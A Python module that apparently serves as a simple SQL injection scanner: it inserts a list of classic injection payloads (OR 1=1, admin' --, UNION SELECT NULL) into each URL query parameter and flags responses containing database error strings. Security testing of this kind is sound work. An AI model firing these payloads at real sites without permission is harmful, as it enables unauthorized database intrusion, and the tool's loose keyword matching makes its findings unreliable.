"""
SQL Injection Tester
Tests URLs for SQL injection vulnerabilities
"""
import requests
import logging
from urllib.parse import urlparse, urlencode, parse_qs
from typing import Dict, List

logger = logging.getLogger(__name__)


class SQLTester:
    """Tests for SQL injection vulnerabilities"""
    
    # Common SQL injection payloads
    PAYLOADS = [
        "' OR '1'='1",
        "' OR 1=1 --",
        "' OR 1=1 #",
        "' OR 1=1 /*",
        "admin' --",
        "admin' #",
        "admin'/*",
        "' or 'a'='a",
        "' UNION SELECT NULL --",
        "1' UNION SELECT NULL, NULL --",
    ]
    
    def __init__(self):
        self.session = requests.Session()
        self.timeout = 10
    
    def test_url(self, url: str) -> Dict:
        """Test URL for SQL injection vulnerabilities"""
        try:
            logger.info(f"Testing {url} for SQL injection")
            
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            vulnerable_params = []
            results = []
            
            # Test each parameter
            for param, values in params.items():
                for payload in self.PAYLOADS:
                    test_url = self._build_test_url(url, param, payload)
                    
                    try:
                        response = self.session.get(test_url, timeout=self.timeout)
                        
                        # Check for SQL error indicators
                        if self._check_vulnerability(response):
                            vulnerable_params.append(param)
                            results.append({
                                'param': param,
                                'payload': payload,
                                'status_code': response.status_code,
                                'vulnerable': True
                            })
                            logger.warning(f"SQL injection found in {param}")
                    except Exception as e:
                        logger.debug(f"Error testing {param}: {e}")
            
            return {
                'vulnerable': len(vulnerable_params) > 0,
                'vulnerable_params': list(set(vulnerable_params)),
                'payloads_tested': len(self.PAYLOADS),
                'results': results
            }
        
        except Exception as e:
            logger.error(f"SQL injection test failed: {e}")
            return {
                'vulnerable': False,
                'vulnerable_params': [],
                'payloads_tested': 0,
                'results': []
            }
    
    def _build_test_url(self, url: str, param: str, payload: str) -> str:
        """Build test URL with SQL injection payload"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        
        # Inject payload into parameter
        if param in params:
            params[param] = [payload]
        
        new_query = urlencode(params, doseq=True)
        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
    
    def _check_vulnerability(self, response) -> bool:
        """Check if response indicates SQL injection vulnerability"""
        sql_errors = [
            'SQL',
            'syntax',
            'mysql_fetch',
            'Warning: mysql',
            'mysql_error',
            'SQLServer',
            'ORA-',
            'ORACLE error',
        ]
        
        response_text = response.text.lower()
        for error in sql_errors:
            if error.lower() in response_text:
                return True
        
        return False
